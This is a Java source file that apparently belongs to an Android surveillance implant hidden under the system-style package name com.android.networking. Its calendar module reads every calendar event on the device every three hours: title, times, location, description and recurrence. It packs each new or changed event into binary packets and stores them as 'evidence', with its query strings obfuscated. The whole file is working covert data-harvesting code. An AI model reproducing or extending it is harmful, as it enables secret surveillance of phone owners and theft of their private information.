package com.android.networking.module;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.conf.ConfModule;
import com.android.networking.crypto.Digest;
import com.android.networking.evidence.EvidenceType;
import com.android.networking.evidence.EvidenceReference;
import com.android.networking.evidence.Markup;
import com.android.networking.util.ByteArray;
import com.android.networking.util.Check;
import com.android.networking.util.DataBuffer;
import com.android.networking.util.DateTime;
import com.android.networking.util.Utils;
import com.android.networking.util.WChar;

public class ModuleCalendar extends BaseModule {

	private static final String TAG = "ModuleCalendar"; //$NON-NLS-1$

	private static final int FLAG_ALLDAY = 0x00000040;

	private static final int POOM_STRING_SUBJECT = 0x01000000;
	private static final int POOM_STRING_CATEGORIES = 0x02000000;
	private static final int POOM_STRING_BODY = 0x04000000;
	private static final int POOM_STRING_RECIPIENTS = 0x08000000;
	private static final int POOM_STRING_LOCATION = 0x10000000;
	private static final int POOM_OBJECT_RECUR = 0x80000000;

	Markup markupCalendar;

	HashMap<Long, Long> calendar;

	public ModuleCalendar() {

	}

	@Override
	public boolean parse(ConfModule conf) {
		return true;
	}

	/**
	 * unserialize the contacts crc hashtable
	 */
	@Override
	public void actualStart() {
		// every three hours, check.
		setPeriod(180 * 60 * 1000);
		setDelay(200);

		markupCalendar = new Markup(this);

		// the markup exists, try to read it
		if (markupCalendar.isMarkup()) {
			try {
				calendar = (HashMap<Long, Long>) markupCalendar.readMarkupSerializable();
			} catch (final IOException e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}

				if (Cfg.DEBUG) {
					Check.log(TAG + " Error (begin): cannot read markup");//$NON-NLS-1$
				}
			}
		}

		if (calendar == null) {
			calendar = new HashMap<Long, Long>();
			serializeCalendar();
		}

	}

	/**
	 * serialize contacts in the markup
	 */
	private void serializeCalendar() {
		if (Cfg.DEBUG) {
			Check.ensures(calendar != null, "null calendar"); //$NON-NLS-1$
		}

		try {

			final boolean ret = markupCalendar.writeMarkupSerializable(calendar);
			if (Cfg.DEBUG) {
				Check.ensures(ret, "cannot serialize"); //$NON-NLS-1$
			}
		} catch (final IOException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (serializeContacts): " + e);//$NON-NLS-1$
			}
		}
	}

	/**
	 * Every once and then read the contactInfo, and Check.every change. If
	 * //$NON-NLS-1$ something is new the contact is saved.
	 */
	@Override
	public void actualGo() {

		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): Calendar"); //$NON-NLS-1$
			}
			if (calendar()) {
				serializeCalendar();
			}
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (go) Error: " + ex); //$NON-NLS-1$
			}
		}
	}

	private boolean calendar() {
		// http://jimblackler.net/blog/?p=151
		// http://forum.xda-developers.com/showthread.php?t=688095
		// /data/data/com.android.providers.calendar/databases/calendar.db
		// backup/data/calendar.db
		// v4: http://stackoverflow.com/questions/10069319/how-to-get-device-calendar-event-list-in-android-device

		HashSet<String> calendars;
		String contentProvider;

		contentProvider = Messages.getString("d_18"); //$NON-NLS-1$
		calendars = selectCalendars(contentProvider);

		if (calendars == null || calendars.isEmpty()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (calendar): opening 2.2 style"); //$NON-NLS-1$
			}
			contentProvider = Messages.getString("d_19"); //$NON-NLS-1$
			calendars = selectCalendars(contentProvider);
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (calendar): opening 2.1 style"); //$NON-NLS-1$
			}
		}

		boolean needToSerialize = false;

		// For each calendar, display all the events from the previous week to
		// the end of next week.
		for (String id : calendars) {
			int calendar_id = Integer.parseInt(id);
			if (Cfg.DEBUG) {
				Check.log(TAG + " (calendar): " + calendar_id); //$NON-NLS-1$
			}
			Uri.Builder builder = Uri.parse(contentProvider + Messages.getString("d_17")).buildUpon(); //$NON-NLS-1$
			String textUri = builder.build().toString();

			Cursor eventCursor = managedQuery(builder.build(), new String[] { Messages.getString("d_7"), Messages.getString("d_8"), Messages.getString("d_9"), Messages.getString("d_10"), //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
					Messages.getString("d_11"), Messages.getString("d_12"), Messages.getString("d_13"), Messages.getString("d_14") }, Messages.getString("d_15") + "=" + id, null, Messages.getString("d_16")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$

			while (eventCursor.moveToNext()) {
				int index = 0;
				final long idEvent = calendar_id << 24 | Long.parseLong(eventCursor.getString(index++));
				final String title = eventCursor.getString(index++);
				final Date begin = new Date(eventCursor.getLong(index++));
				final Date end = new Date(eventCursor.getLong(index++));
				final String rrule = eventCursor.getString(index++);
				final Boolean allDay = !eventCursor.getString(index++).equals("0"); //$NON-NLS-1$

				final String location = eventCursor.getString(index++);
				// final String syncAccount = eventCursor.getString(5);
				String syncAccount = ""; //$NON-NLS-1$
				final String description = eventCursor.getString(index++);

				if (Cfg.DEBUG) {
					Check.log(TAG + " (calendar): Title: " + title + " Begin: " + begin + " End: " + end + " All Day: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
							+ allDay + " Location: " + location + " SyncAccount:" + syncAccount + " Description: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
							+ description);
				}

				byte[] packet = null;
				try {
					// calculate the crc of the contact
					packet = preparePacket(idEvent, title, description, location, begin, end, rrule, allDay);
				} catch (Exception ex) {
					if (Cfg.EXCEPTION) {
						Check.log(ex);
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " (calendar) Error: " + ex); //$NON-NLS-1$
					}
					continue;
				}

				// if(Cfg.DEBUG) Check.log( TAG + " (go): "  ;//$NON-NLS-1$
				// ByteArray.byteArrayToHex(packet));
				final Long crcOld = calendar.get(idEvent);
				final Long crcNew = Digest.CRC32(packet);
				// if(Cfg.DEBUG) Check.log( TAG + " (go): " + crcOld + " <-> "  ;//$NON-NLS-1$
				// crcNew);

				// if does not match, save and serialize
				if (!crcNew.equals(crcOld)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (go): new event. " + idEvent);//$NON-NLS-1$
					}
					calendar.put(idEvent, crcNew);
					saveEvidenceCalendar(idEvent, packet);
					needToSerialize = true;
					//Thread.yield();
				}
			}
		}
		return needToSerialize;
	}

	private HashSet<String> selectCalendars(String contentProvider) {
		String[] projection = new String[] { Messages.getString("d_3"), Messages.getString("d_4"), Messages.getString("d_5"), Messages.getString("d_6") }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
		// Uri calendars = Uri.parse("content://calendar/calendars");
		Uri calendars = Uri.parse(contentProvider + Messages.getString("d_2")); //$NON-NLS-1$

		HashSet<String> calendarIds = new HashSet<String>();

		Cursor managedCursor = managedQuery(calendars, projection, "selected=1", null, null); //$NON-NLS-1$

		while (managedCursor != null && managedCursor.moveToNext()) {

			final String _id = managedCursor.getString(0);
			final String displayName = managedCursor.getString(1);
			final Boolean selected = !managedCursor.getString(2).equals("0"); //$NON-NLS-1$
			final String ownerAccount = managedCursor.getString(2);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (selectCalendars): Id: " + _id + " Display Name: " + displayName + " Selected: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
						+ selected + " OwnerAccount: " + ownerAccount); //$NON-NLS-1$
			}

			calendarIds.add(_id);
		}

		return calendarIds;

	}

	private Cursor managedQuery(Uri calendars, String[] projection, String selection, String[] selectionArgs,
			String sortOrder) {
		Context context = Status.getAppContext();
		ContentResolver contentResolver = context.getContentResolver();

		final Cursor cursor = contentResolver.query(calendars, projection, selection, selectionArgs, sortOrder);

		return cursor;
	}

	/**
	 * Save evidence Calendar
	 * 
	 * @param idEvent
	 * @param packet
	 */
	private void saveEvidenceCalendar(long idEvent, byte[] packet) {
		// calendar.put(idEvent, Encryption.CRC32(packet));
		final EvidenceReference log = new EvidenceReference(EvidenceType.CALENDAR);
		log.write(packet);
		log.close();

	}

	private byte[] preparePacket(long idEvent, String title, String description, String location, Date begin, Date end,
			String rrule, Boolean allDay) {
		final int version = 0x01000000;
		int flags = 0;

		final ByteArrayOutputStream payload = new ByteArrayOutputStream();
		// header, viene scritto adesso, e corretto alla fine, cosi' si calcola
		// la lunghezza del
		// payload
		try {
			payload.write(ByteArray.intToByteArray(0));
			payload.write(ByteArray.intToByteArray(version));
			payload.write(ByteArray.intToByteArray((int) idEvent));

			// preparazione del payload, con la parte fissa e quella dinamica

			if (rrule != null) {
				// flags |= FLAG_RECUR;
				// if (end == null) {
				// flags |= FLAG_RECUR_NoEndDate;
				// }
			}
			if (allDay) {
				flags |= FLAG_ALLDAY;
			}
			int sensitivity = 0;
			int busy = 2;
			int duration = 0;
			int meeting = 0;
			payload.write(ByteArray.intToByteArray(flags));
			payload.write(ByteArray.longToByteArray(DateTime.getFiledate(begin)));
			payload.write(ByteArray.longToByteArray(DateTime.getFiledate(end)));
			payload.write(ByteArray.intToByteArray(sensitivity));
			payload.write(ByteArray.intToByteArray(busy));
			payload.write(ByteArray.intToByteArray(duration));
			payload.write(ByteArray.intToByteArray(meeting));
			// recursive
			// blocchi di stringhe

			if (rrule != null) {
				if (description == null) {
					description = Messages.getString("d_0") + rrule; //$NON-NLS-1$
				} else {
					description += " \n"+  Messages.getString("d_0") + rrule; //$NON-NLS-1$
				}
			}

			appendCalendarString(payload, POOM_STRING_SUBJECT, title);
			appendCalendarString(payload, POOM_STRING_BODY, description);
			appendCalendarString(payload, POOM_STRING_LOCATION, location);

			// appendCalendarString(payload, POOM_STRING_CATEGORIES ,
			// "categories");
			// appendCalendarString(payload, POOM_OBJECT_RECUR , "recur");
			// appendCalendarString(payload, POOM_STRING_RECIPIENTS ,
			// "recipients");

			// final byte[] payloadBA = payload.toByteArray();
			final int size = payload.size();
			final byte[] packet = payload.toByteArray();

			final DataBuffer databuffer = new DataBuffer(packet);
			databuffer.writeInt(size);

			if (Cfg.DEBUG) {
				Check.log(TAG + " (preparePacket): " + ByteArray.byteArrayToHex(packet)); //$NON-NLS-1$
			}
			return packet;

		} catch (IOException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (preparePacket) Error: " + ex); //$NON-NLS-1$
			}
		}
		return null;
	}

	private void appendCalendarString(ByteArrayOutputStream payload, int type, String message) throws IOException {
		if (message != null) {
			byte[] data = WChar.getBytes(message);
			int len = type | (data.length & 0x00ffffff);
			byte[] prefix = ByteArray.intToByteArray(len);
			payload.write(prefix);
			payload.write(data);
		}
	}

	@Override
	public void actualStop() {

	}
}
